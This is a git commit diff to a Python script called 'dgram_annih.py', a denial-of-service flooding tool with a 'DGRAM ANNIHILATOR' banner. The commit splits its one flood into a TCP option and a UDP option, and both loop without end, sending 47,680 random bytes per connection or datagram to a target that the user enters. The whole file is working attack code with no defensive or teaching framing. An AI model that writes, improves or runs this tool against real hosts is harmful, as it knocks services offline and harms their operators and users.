b550d9b25cbb540a329dd45e087e44d8b1a6b08d
h0nt3d <akanoim@gmail.com>
2025-05-23 18:00:44 +0000

    Seperated attacks into TCP and UDP

--- dgram_annih.py
+++ dgram_annih.py
@@ -5,17 +5,34 @@ import time
 import sys
 
 def checkForTarget(ip, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        connection = s.connect_ex((ip, int(port)))
-        s.shutdown(2)
+        connection = sock.connect_ex((ip, int(port)))
+        sock.close()
         return True
     except:
         return False
 
-def attack(ip, port):
+def attackTCP(ip, port):
     countdown = 5
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    #sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #bytes = random._urandom(47680)
+    while countdown > 0:
+        print("Attack Starting in " + str(countdown))
+        countdown = countdown - 1
+        time.sleep(0.5)
+
+    while True:
+        bytes = random._urandom(47680)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, int(port)))
+        sock.sendall(bytes)
+        #s.sendto(bytes, (ip, int(port)))
+        print ("Sent bytes" + " to " + ip + ", port: " + str(port))
+
+def attackUDP(ip):
+    port = 80 #http port
+    countdown = 5
     bytes = random._urandom(47680)
     while countdown > 0:
         print("Attack Starting in " + str(countdown))
@@ -23,22 +40,33 @@ def attack(ip, port):
         time.sleep(0.5)
 
     while True:
-         s.sendto(bytes, (ip, int(port)))
-         print ("Sent bytes" + " to " + ip + ", port: " + str(port))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes, (ip, port))
+        print ("Sent bytes" + " to " + ip + ", port: " + str(port))
+
 
 print("▗▄▄▄   ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖     ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖    ▗▄▖▗▄▄▄▖▗▄▖ ▗▄▄▖ ")
 print("▐▌  █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌    ▐▌ ▐▌▐▛▚▖▐▌▐▛▚▖▐▌  █  ▐▌ ▐▌  █  ▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌ ▐▌")
 print("▐▌  █ ▐▌▝▜▌▐▛▀▚▖▐▛▀▜▌▐▌  ▐▌    ▐▛▀▜▌▐▌ ▝▜▌▐▌ ▝▜▌  █  ▐▛▀▜▌  █  ▐▌   ▐▛▀▜▌ █ ▐▌ ▐▌▐▛▀▚▖")
 print("▐▙▄▄▀ ▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▗▄█▄▖▐▌ ▐▌▗▄█▄▖▐▙▄▄▖▐▌ ▐▌ █ ▝▚▄▞▘▐▌ ▐▌")
 
-ip = input("Enter Host Adress: ")
-port = input("Enter port number: ")
+print("Select Attack Type")
+print("1. TCP")
+print("2. UDP")
+attackType = input("Number of Choice: ")
 
 
-if checkForTarget(ip, port) == True:
-    print("Host Connected")
-    attack(ip, port)
+if attackType == "1":
+    ip = input("Enter Host Address: ")
+    port = input("Enter port number: ")
 
-else:
-    print("Host connection failed")
+    if checkForTarget(ip, port) == True:
+        print("Host Connected")
+        attackTCP(ip, port)
+    else:
+        print("Host connection failed")
+
+elif attackType == "2":
+    ip = input("Enter Host Address: ")
+    attackUDP(ip)
 
